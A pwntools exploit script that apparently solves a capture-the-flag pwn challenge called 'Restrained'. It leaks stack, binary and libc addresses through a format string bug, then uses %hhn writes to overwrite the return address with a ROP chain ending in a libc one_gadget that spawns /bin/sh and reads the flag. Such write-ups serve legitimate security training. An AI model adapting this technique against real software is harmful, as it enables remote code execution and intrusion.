#!/usr/bin/env python3

from pwn import *

PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Restrained/solve/chall"
LIBC_PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Restrained/solve/libc.so.6"
LD_PATH = "/home/spinel99/CTFs/Author/HackingHub/SnykCTF/pwn/Restrained/solve/ld-linux-x86-64.so.2"

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)
ldd = ELF(LD_PATH, checksec=False)

if args.REMOTE:
    HOST = "localhost"
    PORT = 10002
    p = remote(HOST, PORT)
else:
    p = process(PATH)
    if args.GDB:
        GDB_SCRIPT = \
"""
# b *$rebase(0x1247)
b *$rebase(0x127f)
c
"""
        gdb.attach(p, gdbscript=GDB_SCRIPT)

def fmt_write_addr(p: process, addr: int, value: int, iter_num: int = 6):
    for i in range(iter_num):
        p.sendthen(
            f' / 0x{max_iterations:02x}]: '.encode(),
            f'%{value & 0xFF if value > 0 else 256}c%10$hhn'.encode().ljust(0x10, b'a') + p64(addr)
        )
        addr += 1
        value >>= 8

max_iterations = 0x10

s = b'%12$p|%13$p|%17$p'
p.sendlinethen(f' / 0x{max_iterations:02x}]: '.encode(), s)
leak = p.recvline(drop=True).split(b'|')
ret_addr     = int(leak[0], 16) - 0x18
exe.address  = int(leak[1], 16) - 0x1333
libc.address = int(leak[2], 16) - 0x2a575

print(f'return addr:  {hex(ret_addr)}')
print(f'exe.address:  {hex(exe.address)}')
print(f'libc.address: {hex(libc.address)}')

rop = ROP(libc)

# 0xf8d09 execve("/bin/sh", rbp-0x50, r15)
# constraints:
#   address rbp-0x48 is writable
#   r14 == NULL || {"/bin/sh", r14, NULL} is a valid argv
#   [r15] == NULL || r15 == NULL || r15 is a valid envp

# takes 1 iteration
fmt_write_addr(p, ret_addr + 0x00, (exe.address + 0x130a) & 0xFF, 1) # partial overwrite

# takes 6 iterations
fmt_write_addr(p, ret_addr + 0x08, rop.ret.address, 6)

# takes 8 iterations
fmt_write_addr(p, ret_addr + 0x10, libc.address + 0xf8d09, 8)

# total iterations: 16

p.sendline(b'cat flag.txt')

p.interactive()